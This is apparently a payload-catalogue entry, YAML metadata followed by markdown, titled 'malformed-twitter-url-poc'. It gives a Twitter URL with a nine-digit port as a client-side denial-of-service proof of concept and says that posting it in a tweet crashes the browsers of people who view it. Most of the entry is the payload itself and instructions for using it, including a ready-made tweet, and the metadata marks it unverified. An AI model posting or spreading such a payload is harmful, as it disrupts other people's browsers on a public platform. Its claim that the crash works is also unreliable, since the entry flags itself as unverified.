---
data: 'http://twitter.com:627732462'
tags:
  - dos
  - poc
type: command
output: Browser crash on rendering in tweet
executor: text
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:56.185Z'
id: b78f9c37-a105-470e-8f1f-ecfc3542a535
verified: false
validated: true
submitted: true
---
# malformed-twitter-url-poc

## Command

```text
http://twitter.com:627732462
```

## Description

This payload URL with a 9-digit port is posted in a tweet to trigger client-side DoS when viewed on Twitter web.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| port | Excessively long port number (e.g., 627732462) | Yes |
| domain | Target domain (e.g., twitter.com) | Yes |

## Examples

### Basic Usage

```text
http://twitter.com:627732462
```

### Advanced Usage

Use in tweet: "Visit: http://twitter.com:627732462"

## Expected Output

When rendered in browser on twitter.com, causes crash due to parsing overload.

## Related

- [[Related Procedure]]
